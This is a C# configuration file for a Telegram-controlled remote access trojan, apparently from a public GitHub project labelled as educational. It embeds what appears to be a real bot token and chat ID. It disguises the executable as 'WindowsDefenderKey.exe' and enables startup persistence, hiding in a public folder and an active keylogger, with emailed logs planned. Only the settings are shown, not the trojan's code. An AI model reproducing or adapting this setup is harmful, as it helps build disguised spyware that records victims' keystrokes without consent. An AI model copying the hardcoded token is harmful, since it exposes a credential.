using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RAT_BotTelegram {
    internal sealed class config {

        //          |>Solo fines educativos<|
        //          https://github.com/SebastianEPH/RAT_BotTelegram.git
        //          Developed by SebastiánEPH


        // Configuración Inicio
        public const string TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8";  // Token Bot
        public const string ID = "831756903";                                          // ID Chat

        // Config Trojan
        public const bool   STARTUP = true;    // Se inicia automaticamente al iniciar sesión
        public const string NAME_EXE = "WindowsDefenderKey.exe";  // Nombre Dele ejecutable Final
        public const bool   TROJAN = true;      // Se oculta en el sistema
        public const string PATH_OCUL = @"C:\Users\Public\RAT_Telegram";      // Ruta donde se esconde //@"C:\Users\Public\Public Config\Windows\Security\RAT_Telegram"
        public const bool   CONSOLE_DEBUG = true;        // Modo debug =>> Muestra consola al ejecutarse
        public const int    DELAY = 1;                  // Delay despues de iniciar el sistema // Para computadoras sin SSD

        //Config Keylogger 
        public const bool   KEYLOGGER = true;           // True = Keylogger activo  // False = Keylogger deshabilitado
        public const string PATH_LOG= "";               // Ruta donde se guardará el registro de teclas
        public const bool   SEND_GMAIL = false;         // Futura actualización                     
        //public const string SEND_Gmail = "";
        //public const string  = "";
        //public const string  = "";


    }
}
